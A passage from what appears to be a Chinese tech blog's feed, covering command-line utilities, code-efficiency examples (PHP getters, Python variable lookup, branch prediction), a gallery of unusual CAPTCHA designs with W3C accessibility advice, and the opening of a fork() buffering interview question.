<p><a href="https://curl.haxx.se/" target="_blank">cURL</a>是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。cURL还包含了用于程序开发的libcurl。cURL支援的通訊協定有FTP、FTPS、HTTP、HTTPS、TFTP、SFTP、Gopher、SCP、Telnet、DICT、FILE、LDAP、LDAPS、IMAP、POP3、SMTP和RTSP。</p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="rtorrent_aria2"></span>rtorrent &amp; aria2<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://libtorrent.rakshasa.no/" target="_blank">rTorrent</a> 是一个非常简洁、优秀、非常轻量的BT客户端. 它使用了 ncurses 库以 C++ 编写, 因此它完全基于文本并在终端中运行. 将 rTorrent 用在安装有 GNU Screen 和 Secure Shell 的低端系统上作为远程的 BT 客户端是非常理想的。</p>
<p><a href="http://aria2.sourceforge.net/">aria2</a> 是 Linux 下一个不错的高速下载工具。由于它具有分段下载引擎，所以支持从多个地址或者从一个地址的多个连接来下载同一个文件。这样自然就大大加快了文件的下载速度。aria2 也具有断点续传功能，这使你随时能够恢复已经中断的文件下载。除了支持一般的 http(s) 和 ftp 协议外，aria2 还支持 BitTorrent 协议。这意味着，你也可以使用 aria2 来下载 torrent 文件。</p>
<div class="align_right">
<p class="caption_text"> <img alt="image placeholder" ></p>
</div>
<h4>
<span class="ez-toc-section" id="ttytter_earthquake"></span>ttytter &amp; earthquake<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.floodgap.com/software/ttytter" target="_blank">TTYtter</a> 是一个Perl写的命令行上发Twitter的工具，可以进行所有其他平台客户端能进行的事情，当然，支持中文。脚本控、CLI控、终端控、Perl控的最愛。</p>
<p><a href="https://github.com/jugyo/earthquake" target="_blank">Earthquake</a>也是一个命令行上的Twitter客户端。</p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="vifm_ranger"></span>vifm &amp; ranger<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://vifm.sourceforge.net/" target="_blank">Vifm</a> 基于ncurses的文件管理器，DOS风格，用键盘操作。</p>
<p><img alt="image placeholder" ></p>
<p><a href="https://savannah.nongnu.org/projects/ranger" target="_blank">Ranger</a>用 Python 完成，默认为使用 Vim 风格的按键绑定，比如 hjkl（上下左右），dd（剪切），yy（复制）等等。功能很全，扩展/可配置性也非常不错。类似MacOS X下Finder（文件管理器）的多列文件管理方式。支持多标签页。实时预览文本文件和目录。</p>
<div class="align_right">
<p class="caption_text"><img alt="image placeholder" ></p>
</div>
<h4>
<span class="ez-toc-section" id="cowsay_sl"></span>cowsay &amp; sl<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.nog.net/~tony/warez/cowsay.shtml" target="_blank">cowsay </a> 不说了，如下所示，哈哈哈。还有xcowsay，你可以自己搜一搜。</p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text"> sl是什么？ls？，呵呵，你会经常把ls 打成sl吗？如果是的话，这个东西可以让你娱乐一下，你会看到一辆火车呼啸而过~~，相当拉风。你可以使用sudo apt-get install sl 安装。</p>
<p class="caption_text"><img alt="image placeholder" ></p>
<p class="caption_text">最后，再介绍一个命令中linuxlogo，你可以使用 sudo apt-get install linuxlogo来安装，然后，就可以使用linuxlogo -L<br>
来看一下各种Linux的logo了</p>
<p class="caption_text"><img alt="image placeholder" ></p>
<p class="caption_text">（全文完）</p>
</div>
</div>
<p></p>
 ]]></content>
<pubDate>2012-07-11T08:10:11+08:00</pubDate>
<guid>https://coolshell.cn/articles/7829.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 代码执行的效率 ]]></title>
<link>https://coolshell.cn/articles/7886.html</link>
<content><![CDATA[ 
<p>在《<a title="性能调优攻略" href="https://coolshell.cn/articles/7490.html" target="_blank">性能调优攻略</a>》里，我说过，要调优性需要找到程序中的Hotspot，也就是被调用最多的地方，这种地方，只要你能优化一点点，你的性能就会有质的提高。在这里我给大家举三个关于代码执行效率的例子（它们都来自于网上）</p>
<h4><strong>第一个例子</strong></h4>
<p><strong> PHP中Getter和Setter的效率</strong>（<a href="https://www.reddit.com/r/programming/comments/wdsgn/today_i_learned_that_creating_getters_setters_in/" target="_blank">来源reddit</a>）</p>
<p>这个例子比较简单，你可以跳过。</p>
<p>考虑下面的PHP代码：我们可看到，使用Getter/Setter的方式，性能要比直接读写成员变量要差一倍以上。</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">&lt;?php
	//dog_naive.php

	class dog {
		public $name = "";
		public function setName($name) {
			$this-&amp;gt;name = $name;
		}
		public function getName() {
			return $this-&amp;gt;name;
		}
	}

	$rover = new dog();
        //通过Getter/Setter方式
	for ($x=0; $x&lt;10; $x++) {
		$t = microtime(true);
		for ($i=0; $i&lt;1000000; $i++) {
			$rover-&gt;setName("rover");
			$n = $rover-&gt;getName();
		}
		echo microtime(true) - $t;
		echo "\n";
	}
        //直接存取变量方式
        for ($x=0; $x&lt;10; $x++) {
		$t = microtime(true);
		for($i=0; $i&lt;1000000; $i++) {
			$rover-&gt;name = "rover";
			$n = $rover-&gt;name;
		}
		echo microtime(true) - $t;
		echo "\n";
	}
?&gt;</pre>
<p>这个并没有什么稀，因为有函数调用的开销，函数调用需要压栈出栈，需要传值，有时还要需要中断，要干的事太多了。所以，代码多了，效率自然就慢了。所有的语言都这个德行，这就是为什么C++要引入inline的原因。而且Java在打开优化的时候也可以优化之。但是对于动态语言来说，这个事就变得有点困难了。</p>
<p><span id="more-7886"></span></p>
<p>你可能会以为使用下面的代码（Magic Function）会好一些，但实际其性能更差。</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">class dog {
	private $_name = "";
	function __set($property,$value) {
		if($property == 'name') $this-&gt;_name = $value;
	}
	function __get($property) {
		if($property == 'name') return $this-&gt;_name;
	}
}</pre>
<p>动态语言的效率从来都是一个问题，如果你需要PHP有更好的性能，你可能需要使用<a href="https://github.com/facebook/hiphop-php" target="_blank">FaceBook的HipHop</a>来把PHP编译成C语言。</p>
<h4><strong>第二个例子</strong></h4>
<p><strong>为什么Python程序在函数内执行得更快？</strong>（<a href="https://stackoverflow.com/questions/11241523/why-does-python-code-run-faster-in-a-function" target="_blank">来源StackOverflow</a>）</p>
<p>考虑下面的代码，一个在函数体内，一个是全局的代码。</p>
<p>函数内的代码执行效率为 1.8s</p>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">def main():
    for i in xrange(10**8):
        pass
main()</pre>
<p>函数体外的代码执行效率为 4.5s</p>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">for i in xrange(10**8):
    pass</pre>
<p>不用太纠结时间，只是一个示例，我们可以看到效率查得很多。为什么会这样呢？我们使用 <a href="https://docs.python.org/library/dis.html" target="_blank"><code>dis</code> module</a> 反汇编函数体内的bytecode 代码，使用 <a href="https://docs.python.org/library/functions.html#compile" target="_blank"><code>compile</code> builtin</a> 反汇编全局bytecode，我们可以看到下面的反汇编（注意我高亮的地方）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="2">13 FOR_ITER                 6 (to 22)
16 STORE_FAST               1 (i)
19 JUMP_ABSOLUTE           13</pre>
<br>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="2">13 FOR_ITER                 6 (to 22)
16 STORE_NAME               1 (i)
19 JUMP_ABSOLUTE           13</pre>
<p>我们可以看到，差别就是 <a href="https://docs.python.org/library/dis.html#opcode-STORE_FAST" target="_blank"><code>STORE_FAST</code></a> 和 <code><a href="https://docs.python.org/library/dis.html#opcode-STORE_NAME" target="_blank">STORE_NAME</a>，前者比后者快很多。所以，在全局代码中，变量i成了一个全局变量，而函数中的i是放在本地变量表中，所以在全局变量表中查找变量就慢很多。如果你在main函数中声明global i 那么效率也就下来了。</code>原因是，本地变量是存在一个数组中（直到），用一个整型常量去访问，而全局变量存在一个dictionary中，查询很慢。</p>
<p><code>（注：在</code>C/C++中，这个不是一个问题）</p>
<h4><strong>第三个例子</strong></h4>
<p><strong> 为什么排好序的数据在遍历时会更快？</strong>（<a href="https://stackoverflow.com/questions/11227809/why-is-processing-a-sorted-array-faster-than-an-unsorted-array" target="_blank">来源StackOverflow</a>）</p>
<p>参看如下C/C++的代码：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW" data-enlighter-highlight="4"> for (unsigned i = 0; i &lt; 100000; ++i) {
   // primary loop
    for (unsigned j = 0; j &lt; arraySize; ++j) {
        if (data[j] &gt;= 128)
            sum += data[j];
    }
}</pre>
<p>如果你的data数组是排好序的，那么性能是1.93s，如果没有排序，性能为11.54秒。差5倍多。无论是C/C++/Java，或是别的什么语言都基本上一样。</p>
<p>这个问题的原因是——<strong> <a href="https://en.wikipedia.org/wiki/Branch_predictor">branch prediction</a> （分支预判）</strong>伟大的stackoverflow给了一个非常不错的解释。</p>
<p>考虑我们一个铁路分叉，当我们的列车来的时候， 扳道员知道分个分叉通往哪，但不知道这个列车要去哪儿，司机知道要去哪，但是不知道走哪条分叉。所以，我们需要让列车停下来，然后司机和扳道员沟通一下。这样的性能太差了。</p>
<p>所以，我们可以优化一下，那就是猜，我们至少有50%的概率猜对，如果猜对了，火车行驶性能巨高，猜错了，就得让火车退回来。如果我猜对的概率高，那么，我们的性能就会高，否则老是猜错了，性能就很差。</p>
<p><img alt="image placeholder" ></p>
<p style="text-align: center;">Image by Mecanismo, from Wikimedia Commons:<a href="https://commons.wikimedia.org/wiki/File:Entroncamento_do_Transpraia.JPG">http://commons.wikimedia.org/wiki/File:Entroncamento_do_Transpraia.JPG</a></p>
<p>我们的if-else 就像这个铁路分叉一样，下面红箭头所指的就是搬道器。</p>
<p><img alt="image placeholder" ></p>
<p>那么，我们的搬道器是怎么预判的呢？就是使用过去的历史数据，如果历史数据有90%以上的走左边，那么就走左边。所以，我们排好序的数据就更容易猜得对。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">T = 走分支（条件表达式为true）
N = 不走分支(条件表达式为false)

data[] = 0, 1, 2, 3, 4, ... 126, 127, 128, 129, 130, ... 250, 251, 252, ...
branch = N  N  N  N  N  ...   N    N    T    T    T  ...   T    T    T  ...

= NNNNNNNNNNNN ... NNNNNNNTTTTTTTTT ... TTTTTTTTTT  (easy to predict)</pre>
<br>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">data[] = 226, 185, 125, 158, 198, 144, 217, 79, 202, 118,  14, 150, 177, 182, 133, ...
branch =   T,   T,   N,   T,   T,   T,   T,  N,   T,   N,   N,   T,   T,   T,   N  ...

= TTNTTTTNTNNTTTN ...   (completely random - hard to predict)</pre>
<p>从上面我们可以看到，排好序的数据更容易预测分支。</p>
<p>对此，那我们怎么办？我们需要在这种循环中除去if-else语句。比如：</p>
<p>我们把条件语句：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">if (data[j] &gt;= 128)
sum += data[j];
</pre>
<p>变成：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int t = (data[j] - 128) &gt;&gt; 31;
sum += ~t &amp; data[j];</pre>
<p>“没有分叉”的性能基本上和“排好序有分支”一个样，无论是C/C++，还是Java。</p>
<blockquote><p><strong>注：</strong>在GCC下，如果你使用 <code>-O3</code> or <code>-ftree-vectorize</code> 编译参数，GCC会帮你优化分叉语句为无分叉语句。VC++2010没有这个功能。</p></blockquote>
<p><strong>最后，推荐大家一个网站——<a href="https://developers.google.com/speed/" target="_blank">Google Speed</a>，网站上的有一些教程告诉你<a href="https://developers.google.com/speed/articles/" target="_blank">如何写出更快的Web程序</a>。</strong></p>
<p><strong></strong>（全文完）</p>
 ]]></content>
<pubDate>2012-07-13T08:18:32+08:00</pubDate>
<guid>https://coolshell.cn/articles/7886.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 各式各样的验证码 ]]></title>
<link>https://coolshell.cn/articles/7917.html</link>
<content><![CDATA[ 
<p>还记得以前那篇《<a title="超强的验证码" href="https://coolshell.cn/articles/3277.html" target="_blank">超强验证码</a>》？其实这个世界变态的验证码还有很多，下面是一个列表向像展示了各种稀奇古怪的验证码。不过本文并不单单只是收集这验证码，前面的比较恶搞，后面的会向你展示什么是有accessibility验证码。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%AE%8C%E5%85%A8%E7%9C%8B%E4%B8%8D%E6%B8%85%E6%A5%9A%E7%9A%84" title="完全看不清楚的">完全看不清楚的</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%9C%8B%E5%BE%97%E6%B8%85%E4%BD%86%E4%BB%A4%E4%BA%BA%E6%8A%93%E7%8B%82%E7%9A%84" title="看得清但令人抓狂的">看得清但令人抓狂的</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E7%9A%84" title=" 
  
数学公式的">
数学公式的</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E6%99%BA%E5%8A%9B%E9%A2%98" title="智力题">智力题</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E4%BD%A0%E7%9A%84%E5%AE%A1%E7%BE%8E%E6%B0%B4%E5%B9%B3%E6%AD%A3%E5%B8%B8%E5%90%97%EF%BC%9F" title="你的审美水平正常吗？">你的审美水平正常吗？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E4%BD%A0%E6%87%82%E7%9B%B2%E6%96%87%E5%90%97%EF%BC%9F" title="你懂盲文吗？">你懂盲文吗？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#ASCII%E5%9B%BE%E7%89%87%E5%BC%8F" title="ASCII图片式">ASCII图片式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E6%80%8E%E4%B9%88%E9%AA%8C%E8%AF%81%E4%B8%80%E4%B8%AA%E4%BA%BA%E6%98%AF%E5%90%A6%E6%88%90%E5%B9%B4" title="怎么验证一个人是否成年">怎么验证一个人是否成年</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#3D%E9%AA%8C%E8%AF%81%E7%A0%81" title="3D验证码">3D验证码</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#reCaptcha" title="reCaptcha">reCaptcha</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#Facebook%E7%9A%84%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81" title="Facebook的人脸识别验证码">Facebook的人脸识别验证码</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#%E5%BE%AE%E8%BD%AF%E7%9A%84ASIRRA" title="微软的ASIRRA">微软的ASIRRA</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-13" href="#DISTCHA" title="DISTCHA">DISTCHA</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-14" href="#MotionCAPTCHA" title="MotionCAPTCHA">MotionCAPTCHA</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-15" href="#siteHelp%E7%9A%84DragCapCha" title="siteHelp的DragCapCha">siteHelp的DragCapCha</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-16" href="#jQuery_%E9%AA%8C%E8%AF%81%E7%A0%81%E6%8F%92%E4%BB%B6" title="jQuery 验证码插件">jQuery 验证码插件</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-17" href="#jQuery_s3Capcha_%E6%8F%92%E4%BB%B6" title="jQuery s3Capcha 插件">jQuery s3Capcha 插件</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-18" href="#Ajax_Fancy_Captcha" title="Ajax Fancy Captcha">Ajax Fancy Captcha</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-19" href="#wCaptcha" title="wCaptcha">wCaptcha</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-20" href="#Picatcha" title="Picatcha">Picatcha</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-21" href="#yoCaptcha" title="yoCaptcha">yoCaptcha</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-22" href="#W3C%E7%9A%84%E5%BB%BA%E8%AE%AE" title="W3C的建议">W3C的建议</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%AE%8C%E5%85%A8%E7%9C%8B%E4%B8%8D%E6%B8%85%E6%A5%9A%E7%9A%84"></span>完全看不清楚的<span class="ez-toc-section-end"></span>
</h4>
<p>这是人类的字符吗？</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">图案中的字母是什么？</p>
<p><img alt="image placeholder" ></p>
<p><span id="more-7917"></span></p>
<p>这也够奇葩的了。</p>
<p><img alt="image placeholder" ></p>
<h4 style="text-align: left;">
<span class="ez-toc-section" id="%E7%9C%8B%E5%BE%97%E6%B8%85%E4%BD%86%E4%BB%A4%E4%BA%BA%E6%8A%93%E7%8B%82%E7%9A%84"></span>看得清但令人抓狂的<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://coolshell.cn/wp-content/uploads/2012/07/2.jpg"><img alt="image placeholder" ></a><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E7%9A%84"></span><a href="https://coolshell.cn/wp-content/uploads/2012/07/1.jpg"><br>
</a> <a href="https://coolshell.cn/wp-content/uploads/2012/07/2.jpg"><br>
</a>数学公式的<span class="ez-toc-section-end"></span>
</h4>
<p>如果你填对了，你是人类吗？</p>
<p><a href="https://coolshell.cn/wp-content/uploads/2012/07/4.jpg"><br>
<img alt="image placeholder" ></a></p>
<p><a href="https://coolshell.cn/wp-content/uploads/2012/07/7.jpg"><br>
</a> <img alt="image placeholder" ></p>
<h4 style="text-align: left;">
<span class="ez-toc-section" id="%E6%99%BA%E5%8A%9B%E9%A2%98"></span>智力题<span class="ez-toc-section-end"></span>
</h4>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p><img alt="image placeholder" ></p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2012/07/9.jpg"><img alt="image placeholder" ></a></p>
<h4>
<span class="ez-toc-section" id="%E4%BD%A0%E7%9A%84%E5%AE%A1%E7%BE%8E%E6%B0%B4%E5%B9%B3%E6%AD%A3%E5%B8%B8%E5%90%97%EF%BC%9F"></span>你的审美水平正常吗？<span class="ez-toc-section-end"></span>
</h4>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="%E4%BD%A0%E6%87%82%E7%9B%B2%E6%96%87%E5%90%97%EF%BC%9F"></span>你懂盲文吗？<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://coolshell.cn/wp-content/uploads/2012/07/a438_c13.jpg"><img alt="image placeholder" ></a></p>
<h4>
<span class="ez-toc-section" id="ASCII%E5%9B%BE%E7%89%87%E5%BC%8F"></span>ASCII图片式<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<h4 style="text-align: left;"></h4>
<h4></h4>
<h4>
<span class="ez-toc-section" id="%E6%80%8E%E4%B9%88%E9%AA%8C%E8%AF%81%E4%B8%80%E4%B8%AA%E4%BA%BA%E6%98%AF%E5%90%A6%E6%88%90%E5%B9%B4"></span>怎么验证一个人是否成年<span class="ez-toc-section-end"></span>
</h4>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2012/07/filter_8cd6a950-a3ba-42a1-ac47-6d4c8276e6e5.jpg"><br>
</a> <img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="3D%E9%AA%8C%E8%AF%81%E7%A0%81"></span>3D验证码<span class="ez-toc-section-end"></span>
</h4>
<p>通个这个脚本自动生成的：<a href="http://ocr-research.org.ua/tb/getimage.php5" target="_blank">http://ocr-research.org.ua/tb/getimage.php5</a></p>
<p><a href="http://ocr-research.org.ua/tb/getimage.php5"><img alt="image placeholder" ></a></p>
<h4></h4>
<h4>
<span class="ez-toc-section" id="reCaptcha"></span>reCaptcha<span class="ez-toc-section-end"></span>
</h4>
<p>相信大家都知道reCAPTCHA下了一盘很大的棋，它让你在输验证码的时候还帮着还原书籍中那些很难被OCR识别的单词。其有两组验证码，一组是可以被电脑识别的，另一组是不能被电脑识别的（也就是让人来帮电脑识别的），如果你第一组答对了，就会被 认为是人工操作，于是你回答的第二组就会成为人肉OCR。</p>
<p><img alt="image placeholder" ></p>
<p>它最近又将增加一项新功能：显示Google地图上的街景地址和名称。这样从地图上的街景中提取街道地址和名称以及交通标志等数据，以完善Google地图上的信息。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="Facebook%E7%9A%84%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81"></span>Facebook的人脸识别验证码<span class="ez-toc-section-end"></span>
</h4>
<p>你觉得有创意吗?</p>
<p><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="%E5%BE%AE%E8%BD%AF%E7%9A%84ASIRRA"></span><a href="http://research.microsoft.com/en-us/um/redmond/projects/asirra/" target="_blank">微软的ASIRRA</a><span class="ez-toc-section-end"></span>
</h4>
<p style="text-align: center;"><a href="http://research.microsoft.com/en-us/um/redmond/projects/asirra/"><img alt="image placeholder" ></a></p>
<h4>
<span class="ez-toc-section" id="DISTCHA"></span><a href="http://accessibiliteweb.com/stuff/captcha-slider.html" target="_blank">DISTCHA</a><span class="ez-toc-section-end"></span>
</h4>
<p>通过像iPhone/iPad开启时滑动的样式来验证。</p>
<p style="text-align: center;"><a href="http://accessibiliteweb.com/stuff/captcha-slider.html"><img alt="image placeholder" ></a></p>
<h4>
<span class="ez-toc-section" id="MotionCAPTCHA"></span><a title="MotionCAPTCHA jQuery plugin" href="http://josscrowcroft.com/projects/motioncaptcha-jquery-plugin/" target="_blank">MotionCAPTCHA</a><span class="ez-toc-section-end"></span>
</h4>
<p>用鼠标来画个画。</p>
<p><a href="http://josscrowcroft.com/projects/motioncaptcha-jquery-plugin/"><img alt="image placeholder" ></a></p>
<h4>
<span class="ez-toc-section" id="siteHelp%E7%9A%84DragCapCha"></span><a href="http://sitehelp.com.au/demos/dragcaptcha.php" target="_blank">siteHelp的DragCapCha</a><span class="ez-toc-section-end"></span>
</h4>
<p>为下面的字母排个序吧</p>
<p><a href="http://sitehelp.com.au/demos/dragcaptcha.php"><img alt="image placeholder" ></a></p>
<h4>
<span class="ez-toc-section" id="jQuery_%E9%AA%8C%E8%AF%81%E7%A0%81%E6%8F%92%E4%BB%B6"></span>jQuery 验证码插件<span class="ez-toc-section-end"></span>
</h4>
<h5>
<span class="ez-toc-section" id="jQuery_s3Capcha_%E6%8F%92%E4%BB%B6"></span><a href="http://serie3.info/s3capcha/demonstration.php" target="_blank">jQuery s3Capcha 插件</a><span class="ez-toc-section-end"></span>
</h5>
<p><a href="http://serie3.info/s3capcha/demonstration.php"><img alt="image placeholder" ></a></p>
<h5>
<span class="ez-toc-section" id="Ajax_Fancy_Captcha"></span><a href="http://www.webdesignbeach.com/beachbar/ajax-fancy-captcha-jquery-plugin" target="_blank">Ajax Fancy Captcha</a><span class="ez-toc-section-end"></span>
</h5>
<p>和上面那个不一样，这个需要拖动</p>
<p><a href="http://www.webdesignbeach.com/beachbar/ajax-fancy-captcha-jquery-plugin"><img alt="image placeholder" ></a></p>
<h5>
<span class="ez-toc-section" id="wCaptcha"></span><a href="http://www.wozia.pt/blog/wcaptcha-a-better-captcha-alternative-jquery-captcha-plugin/" target="_blank">wCaptcha</a><span class="ez-toc-section-end"></span>
</h5>
<p>和上面的很相似。</p>
<p><a href="http://www.wozia.pt/blog/wcaptcha-a-better-captcha-alternative-jquery-captcha-plugin/"><img alt="image placeholder" ></a></p>
<h4>
<span class="ez-toc-section" id="Picatcha"></span><a href="http://www.picatcha.com/captcha/" target="_blank">Picatcha</a><span class="ez-toc-section-end"></span>
</h4>
<p>挑出所有的计算器</p>
<p><a href="http://www.picatcha.com/captcha/"><img alt="image placeholder" ></a></p>
<h4>
<span class="ez-toc-section" id="yoCaptcha"></span><a href="http://yocaptcha.com/" target="_blank">yoCaptcha</a><span class="ez-toc-section-end"></span>
</h4>
<p>广告式的验证码</p>
<p><a href="http://yocaptcha.com/"><img alt="image placeholder" ></a></p>
<h4>
<span class="ez-toc-section" id="W3C%E7%9A%84%E5%BB%BA%E8%AE%AE"></span>W3C的建议<span class="ez-toc-section-end"></span>
</h4>
<p>W3C的这篇文章（<a href="https://www.w3.org/TR/turingtest/">http://www.w3.org/TR/turingtest/</a>）表达了传统的验证码图片的Inaccessibility的问题，而且一些验证码都很容易被破解。如：</p>
<ul>
<li><a href="http://www.brains-n-brawn.com/default.aspx?vDir=aicaptcha">aiCaptcha: Using AI to beat CAPTCHA and post comment spam</a></li>
<li><a href="https://www.cs.berkeley.edu/~mori/gimpy/gimpy.html">Breaking CAPTCHAs Without Using OCR</a></li>
<li><a href="http://sam.zoy.org/pwntcha/">PWNtcha – CAPTCHA decoder</a></li>
</ul>
<p>W3C也给了一些解决方案：</p>
<ul>
<li>一些逻辑题或是智力题。</li>
<li>声音输出，为了照顾残疾人。 <a href="http://news.com.com/2100-1032-1022814.html">Spam-bot tests flunk the blind</a>
</li>
<li>限制帐号的操作次数。</li>
<li>使用现有的Spam检测机制。如：酷壳（Coolshell.cn）的评论没有验证码，垃圾评论完全靠<a href="https://akismet.com/" target="_blank">Akismet</a> 插件过滤。</li>
</ul>
<p>建议你移步去看看这篇文章。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-07-19T08:32:09+08:00</pubDate>
<guid>https://coolshell.cn/articles/7917.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一个fork的面试题 ]]></title>
<link>https://coolshell.cn/articles/7965.html</link>
<content><![CDATA[ 
<p>前两天有人问了个关于Unix的fork()系统调用的面试题，这个题正好是我大约十年前找工作时某公司问我的一个题，我觉得比较有趣，写篇文章与大家分享一下。这个题是这样的：</p>
<p><strong>题目：请问下面的程序一共输出多少个“-”？</strong></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;

int main(void)
{
   int i;
   for(i=0; i&lt;2; i++){
      fork();
      printf("-");
   }

   wait(NULL);
   wait(NULL);

   return 0;
}
</pre>
<p>如果你对fork()的机制比较熟悉的话，这个题并不难，输出应该是6个“-”，但是，实际上这个程序会很tricky地输出8个“-”。</p>
<p>要讲清这个题，我们首先需要知道fork()系统调用的特性，</p>
<p><span id="more-7965"></span></p>
<ul>
<li>fork()系统调用是Unix下以自身进程创建子进程的系统调用，一次调用，两次返回，如果返回是0，则是子进程，如果返回值&gt;0，则是父进程（返回值是子进程的pid），这是众为周知的。</li>
</ul>
<ul>
<li>还有一个很重要的东西是，在fork()的调用处，整个父进程空间会原模原样地复制到子进程中，包括指令，变量值，程序调用栈，环境变量，缓冲区，等等。</li>
</ul>
<p>所以，上面的那个程序为什么会输入8个“-”，这是因为printf(“-“);语句有buffer，所以，对于上述程序，printf(“-“);把“-”放到了缓存中，并没有真正的输出（参看《<a title="C语言的谜题" href="https://coolshell.cn/articles/945.html" target="_blank">C语言的迷题</a>》中的第一题），<strong>在fork的时候，缓存被复制到了子进程空间</strong>，所以，就多了两个，就成了8个，而不是6个。</p>
<p>另外，多说一下，我们知道，Unix下的设备有“<a href="https://en.wikipedia.org/wiki/Device_file#Block_devices" target="_blank">块设备</a>”和“<a href="https://en.wikipedia.org/wiki/Device_file#Character_devices" target="_blank">字符设备</a>”的概念，所谓块设备，就是以一块一块的数据存取的设备，字符设备是一次存取一个字符的设备。磁盘、内存都是块设备，字符设备如键盘和串口。<strong>块设备一般都有缓存，而字符设备一般都没有缓存</strong>。</p>
<p>对于上面的问题，我们如果修改一下上面的printf的那条语句为：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">printf("-\n");</code></p>
<p>或是</p>
<p></p>
